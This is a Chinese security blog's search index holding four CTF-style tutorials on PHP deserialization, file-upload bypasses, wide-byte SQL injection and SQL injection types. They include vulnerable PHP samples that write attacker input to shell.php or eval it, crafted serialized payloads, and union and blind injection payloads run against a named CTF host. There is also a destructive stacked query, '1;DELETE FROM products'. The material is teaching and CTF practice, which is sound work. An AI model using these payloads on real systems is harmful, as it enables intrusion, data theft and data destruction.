<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[php反序列化]]></title>
    <url>%2F2018%2F08%2F26%2F%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[php反序列化漏洞，又叫php对象注入漏洞。 0x00 序列化与反序列化php中有两个函数serialize()和unserialize()。 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下：12345678&lt;?phpclass anonym1ty&#123; var $test = '123';&#125;$class1 = new anonym1ty;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 这里创建了一个新的对象，并且将其序列化后的结果打印出来：1O:9:&quot;anonym1ty&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; 这里的O代表储存的是对象（object），假如给serialize()传入的是一个数组，那它会变成字母a。9表示对象名称有9个字符。&quot;anonym1ty&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度,&quot;test&quot;为字符串的名称，之后的类似。 unserialize()与serialize()对应的，unserialize()可以从已储存的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。123456789&lt;?phpclass anonym1ty&#123; var $test = '123';&#125;$class2 = 'O:9:"anonym1ty":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);?&gt; 打印出来的结果为：12O:9:&quot;anonym1ty&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;anonym1ty Object ( [test] =&gt; 123 ) 补充：当使用unserialize()恢复对象时，将调用__wakeup()成员函数。 0x01 反序列化漏洞由前面可以看出，当传给unserialize()的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 利用构造函数Magic functionphp中有一类特殊的方法叫”Magic function”，这里着重关注以下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct():当对象被销毁时会自动调用。 __wakeup():unserialize()时会自动调用。测试代码：1234567891011121314151617181920212223&lt;?phpclass anonym1ty&#123; var $test = '123'; function __wakeup()&#123; echo "__wakeup"; echo "&lt;/br&gt;"; &#125; function __construct()&#123; echo "__construct"; echo "&lt;/br&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;/br&gt;"; &#125;&#125;$class2 = 'O:9:"anonym1ty":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);echo "&lt;/br&gt;";?&gt; 打印出来的结果为：1234O:9:&quot;anonym1ty&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;__wakeupanonym1ty Object ( [test] =&gt; 123 ) __destruct 利用场景###wakeup()或 destruct()unserialize()后会导致wakeup() 或 destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在wakeup() 或 destruct()中,从而当我们控制序列化字符串时可以去直接触发它们。这里针对__wakeup()场景做个实验。测试代码如下：12345678910111213141516&lt;?phpclass anonym1ty&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo "&lt;/br&gt;";$class3_unser = unserialize($class3);require "shell.php";// 为显示效果，把这个shell.php包含进来?&gt; 在index.php目录下有个空的shell.php文件。访问index.php。基本的思路是，本地搭建好环境，通过serialize()得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为&quot;&lt;?php phpinfo(); ?&gt;&quot;,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。写一个php脚本：123456789101112&lt;?phpclass anonym1ty&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new anonym1ty();$class4-&gt;test = "&lt;?php phpinfo(); ?&gt;"; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; 由此得到序列化结果:1O:9:&quot;anonym1ty&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125; 在shell.php中也被写入的&lt;?php phpinfo(); ?&gt; 0x02 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。测试代码：123456789101112131415161718192021222324&lt;?phpclass anonym1ty &#123; var $test; function __construct() &#123; $this-&gt;test = new dou1(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class dou1 &#123; function action() &#123; echo "dou1"; &#125;&#125;class dou2 &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new anonym1ty();unserialize($_GET['test']);?&gt; 本意上，new一个新的anonym1ty对象后，调用construct(),其中又new了dou1对象。在结束后会调用 destruct(),其中会调用action(),从而输出dou1。下面是利用过程，构造序列化：123456789101112&lt;?phpclass anonym1ty &#123; var $test; function __construct() &#123; $this-&gt;test = new dou2(); &#125;&#125;class dou2 &#123; var $test2 = "phpinfo();";&#125;echo serialize(new anonym1ty());?&gt; 得到1O:9:&quot;anonym1ty&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;dou2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 传给参数test。 0x03 个人的闲谈php反序列化在CTF也算较为常见的题型，本文的为一些较为基础的利用方法，具体题目可能会遇到很多坑，还需细细品味。希望这篇文章对初学者能有所帮助。]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件上传]]></title>
    <url>%2F2018%2F08%2F16%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[0x00:文件上传漏洞原理0x01:pass-01源码：根据提示客户端使用js对不合法图片进行检查，而源码只对文件后缀进行了校验，可通过抓包来改文件后缀名。将此处改为.php即可绕过。 0x02:pass-02源码：这题对数据包MIME进行检查，只过滤了文件类型，没有过滤文件后缀名。可以通过抓包修改Content-Type进行绕过。 0x03:pass-05源码：这题过滤了大部分文件名，但没有对文件名后缀进行统一大小写。可以使用大小写绕过黑名单。即上传一个.phP文件即可。 0X04:pass-06源码：本题未对尾部空格进行过滤，抓包在文件末尾添加空格即可绕过。 0x05:pass-07源码：这题题目没有去除文件后缀的点，由于windows文件后缀名只有点时会被去除，可以抓包加点绕过。在上传的文件夹下可以看到，文件名为.php后面的点被去除了。 0x06:pass-08源码：本题没有去除字符串::$DATA，抓包添加::$DATA即可绕过，即上传test8.php::$DATA之后会变成test8.php。上传后在upload文件夹下为 0x07:pass-09源码：本题虽然对大小写、点等都进行了过滤，缺不够严谨只过滤了一次，因此可以构造文件名为Test9.php. . 0x08:pass-10源码：这题中$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);过滤了后缀名，可以通过构造后缀名为.pphphp来绕过。由于配置的环境问题，剩余的pass无法实现，这里对剩下的个人对文件上传的利用进行一些总结。%00截断：这类的文件上传通常可以通过构造文件名：文件名.php%00.jpg的方法绕过白名单的方式上传文件。00截断：截断的核心，就是chr(0)这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！ 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 。使用抓包工具进行改包然后将+的hex值2b改为00之后释放包即可]]></content>
  </entry>
  <entry>
    <title><![CDATA[宽字节注入]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[记一次宽字节注入的练习。 宽字节注入原理：GBK 占用两字节 ASCII占用一字节 PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。 %DF ：会被PHP当中的addslashes函数转义为“%DF\&#39;” ，“\”既URL里的%5C，那么也就是说，“%DF&#39;”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”题目地址：[题目传送][题目传送]:http://wpt5.xiniani.org/?id=1做这题的时候充满了曲折，服务器原因，题目各种连不上，最后还是成功做出来了。先来看看这题，题目刚进去就只有看见id=1可以联想到注入，可是试了各种方式都没用，经过ju5tw4nty0u师傅的提示，这题对单引号进行了转义，可以采用宽字节注入绕过。于是先构造payload进行绕过单引号转义：?id=1%D6%27%20AND 1=1--+返回正常页面，再用?id=1%D6%27%20AND 1=2--+，则返回空白页面，说明我们成功的通过宽字节注入绕过了单引号转义。后面就是一些简单的注入过程，先用order by查看字段数，发现存在3个字段，在第三个字段有q1005的库,payload:http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+再查看q1005的表名，payload:http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7131303035--+再查看列，payload:http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns where table_name=0x7131303035--+查看字段，payload:http://wpt5.xiniani.org/?id=-1%DF%27%20union%20select%201,2,group_concat(content)%20from%20q1005--+这个地方很坑，又遇见了熟悉的Hello,man!没看见flag，，，失败最后只能去找找另一个表里的内容，同样的方法，在admin_ff表里找到一个用户名：xinian和密码：c3cbd894ea3620ffceb088671363eda0密码通过md5解密。然后通过登录得到flag]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL注入]]></title>
    <url>%2F2018%2F08%2F14%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[#什么是SQL注入#SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，比如很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击。SQL注入攻击是黑客对数据库进行攻击的常用手段之一。 SQL注入的原理 SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。 SQL注入的类型按照注入点类型来分（1） 数字型注入点在web端大概是http://xxx.com/news.php?id=1这种形式，其注入点id类型为数字，所以叫数字型注入点。这一类的SQL语句原型大概为select from 表名 where id=1。组合出来的SQL注入语句为`select from news where id=1 and 1=1`。 （2） 字符型注入点在web端大概是http://xxx.com/news.php?name=admin这种形式，其注入点name类型为字符类型，所以叫字符型注入点。这一类的SQL语句原型大概为select * from 表名 where name=’admin’。注意多了引号，组合出来的SQL注入语句为select * from news where name=’admin’ and ‘1’=’1。闭合单引号chr=’admin’ union select 1,2,3,4 and ‘1’=’1 chr=’admin’(闭合前面的单引号) union select 1,2,3,4 and ‘1’=’1 （3） 搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有”keyword=关键字”，有的不显示在链接地址里面，而是直接通过搜索框表单提交。此类注入点提交SQL语句，其原型大致为select * from 表名 where 字段like ‘%关键字%’。组合出来的SQL注入语句为：select * from news where search like ‘%测试%’ and ‘%1%’=’%1%’ 按照数据提交的方式来分类（1） GET注入———————————————————————–提交数据的方式是GET，注入点的位置在GET参数部分。比如有这样的一个链接http://xxx.com/news.php?id=1,id是注入点。原理：没有过滤GET请求中的参数信息中的非法字符。 （2） POST注入使用POST方法提交数据，注入点位置在POST数据部分，常发生在表单中。原理：没有过滤掉POST请求中的参数信息中的非法字符。这里举一道南邮的例题，SQL注入1。这题直接查看源码因为POST请求中未对参数信息进行非法字符过滤，可以直接通过输入admin’) – adds(任意字符)来获取flag。 （3） Cookie注入 HTTP请求的时候会带上客户端的Cookie，注入点存在Cookie当中的某个字段中。 原理：cookie注入的形成有两个必须条件，条件1是程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。 按照执行效果来分类（1） 基于布尔的盲注可以根据返回页面判断条件真假的注入。原理：基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。 这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。此类注入常用到的三种函数： mid()函数 mid(string,start,length)string(必需)规定要返回其中一部分的字符串。start(必需)规定开始位置（起始值为1）。length(可选)要返回的字符数。如果省略，则mid()函数返回剩余文本。 substr()函数 substr(string,start,length)string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被返回字符串的长度。应用：http://xxx.com/?id=1’ and ascii(substr((select database()),2,1))&gt;100# （这里使用了ASCII判断）如果页面返回正常，则说明库的第二位大于ascii值大于100。 left()函数 left(string,length)string(必需)规定要返回其中一部分的字符串length(可选)规定被返回字符串的前length长度的字符。应用：http://xxx.com/?id=1’ and left(database(),1)&lt;’t’# 如果页面返回正常，则说明库的首字母应该小于t （2）基于时间的盲注即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。原理：在我们注入了SQL代码之后，存在以下两种情况：（1） 如果注入的SQL代码不影响后台（数据库）的正常功能执行，那么Web应用的页面显示正确（原始页面）。（2） 如果注入的SQL代码影响后台（数据库）的正常功能（产生了SQL注入），但是此时Web应用的页面依旧显示正常（原因是Web应用程序采取了“重定向”或“屏蔽”措施）。那么我们Web应用程序是否存在SQL注入？面对这种情况，前面的基于布尔的SQL盲注就很难发挥作用了。这时，我们一般采用基于web应用响应时间上的差异来判断是否存在SQL注入，即基于时间型SQL盲注。在基于时间型SQL盲注中，我们经常使用条件语句来判断我们的操作是否正确：即if语句/if()函数。在mysql中if语句的语法：IF expression THEN Statements; END IF;即如果某条件发生，那么执行语句一；否则，执行语句二。If()函数的语法如下：IF(expr1,expr2,expr3)即如果expr1的值为true,则返回expr2的值，如果expr1的值为false,则返回expr3的值此类注入主要用到的函数有两种： sleep()函数 sleep()函数可使代码执行延迟若干秒。应用：http://xxx.com/?id=1’ and if(ascii(substr(database(),1,1)&gt;116),1,sleep(5))#如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么晚过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确，即我们的出发点就回到了之前的基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。 （3）基于报错注入即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。应用：select count(*),(concat(floor(rand()*2),(select version())))x from information_schema.tables group by xfloor:取float的整数值rand:取0~1之间随机浮点值group by：为聚合函数，根据一个或多个列对结果集进行分组并有排序功能floor(rand()*2):rand为0~1,rand()*2为0~2，那么整个语句就是取0，1，2三个数字。也可写为：select count(*),(concat(floor(rand(0)*2),(select version())))x from information_schema.tables group by x其中rand()与rand(0)的区别为rand()生成的数据毫无规律，而rand(0)生成的数据则有规律可循 是：0110 0110 （4）联合查询注入前提条件：页面上有显示位显示位的解释：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。知道了在什么情况下使用联合注入之后，来看一看联合查询注入是如何实现的。 判断有无注入点（1） 在url后面加入and 1=1 --+执行，然后再写上and 1=2 --+执行，查看页面是否回显不同（回显不同说明这是一个整形注入），如果回显相同则可能存在字符注入。（2） 在参数后面加上一个’看页面回显是否相同（3） \为转义符（4） -1/+1回显上一个或下一个页面（用于整形判断）判断是整形注入还是字符型注入数字型注入与字符型注入的最大区别在于数字型不需要闭合，而字符型需要引号闭合。知道了整型还是字符型注入之后，使用order by 函数来判断站点中字段数目union的作用是将两个或多个select语句查询语句结果合并起来 union必须由两条或两条以上的select语句组成，语句之间用关键字union分隔。 union中的每个查询的列数必须相同。 union会从查询结果集中自动去除了重复行使用group_concat()函数可以让查询获得的数据组成一行不显示例子：`select group_concat(SCHEMA_NAME) from information_schema.SCHEMATAcount()`函数用于统计个数（类似于表的个数，数据库的个数等等） 例子： `select count(SCHEMA_NAME) from information_schema.SCHEMATA concat()`函数可以将多个字符串拼接在一起 介绍一些获取数据库中的所有数据名，表名，列名，字段名常用指令 `select schema_name from information_schema.schemata(获取数据库名)` `select table_name from information_schema.tables (获取表名)` `select column_name from information_schema.columns(获取所以列名)` （5）堆叠注入（堆查询注入） 原理：在SQL中，分号（；）是用来表示一条sql语句的结束。试想一下我们在;结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection(联合注入)也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如，用户输入：1;DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。局限：并不是每一个环境学都可以执行，可能受到API或者数据库引擎不支持的限制。在MYSQL下使用堆叠注入查询数据： select * from 表名 where id=1;select 1,2,3 SQL注入漏洞的修复（1） 接收提交的参数，把特殊符号过滤掉可以通过使用mysql_real_escape_string()函数对sql语句中的特殊字符进行转义。受影响的字符有：\x00 \n \r \ ‘ “ \x1a如果成功，则该函数返回被转义的字符串。如果失败，则返回false。 （2） 采用sql语句预编译和绑定变量，防御sql注入。String sql = &quot;select id, no from user where id=?&quot;; PreparedStatement ps = conn.prepareStatement(sql); ps.setInt(1, id); ps.executeQuery();采用PreparedStatement，就会将SQL语句：“select id,no from user where id=?”预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划。后面输入的参数，无论输入的是什么，都不会影响sql语句的语法结构，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如select,from,where,and,or,order by等等。所以即使后面输入这些sql命令，也不会当成sql命令来执行了，因为这些sql命令的执行，必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。 （3） 字符串替换使用str_replace()函数对字符串变量的内容进行字符替换。语法如下：str_replace(“需要替换的字段”,“替换为的字段”,”字符串内容”);例如：$id=$_GET[‘id’]; $id=str_replace(“and”,” ”,$id);这样一来，变量id字符串中的“and”被替换为空字符，可以理解为被删除了。而这种方式只替换了一个字符，sql中的执行字符可能需要替换十几个字符。所以需要使用数组的方式，将字符替换封装为一个函数，便于在任何时候调用它。例如：function fliter_sql($value){ $sql = array(“select”,”insert”,”updata”,”delete”); $sql_re=array(“ ”,” ”,” ”,” ”); return str_replace($sql,$sql_re,$value); }类似这样的进行一些字符的过滤。]]></content>
  </entry>
</search>
